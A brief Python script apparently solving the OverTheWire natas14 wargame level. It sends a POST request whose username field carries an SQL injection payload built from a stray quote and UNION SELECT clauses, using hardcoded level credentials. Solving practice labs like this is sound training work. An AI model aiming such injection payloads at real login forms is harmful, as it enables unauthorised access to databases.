#!/bin/python3
import requests

user = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/' % user

obj = {'username': 'natas14" union SELECT * from users union SELECT * from users where username="natas14', 'password': 'boh'}

sessione = requests.Session()
post = sessione.post(url, data=obj, auth=(user, password))
print(post.text)
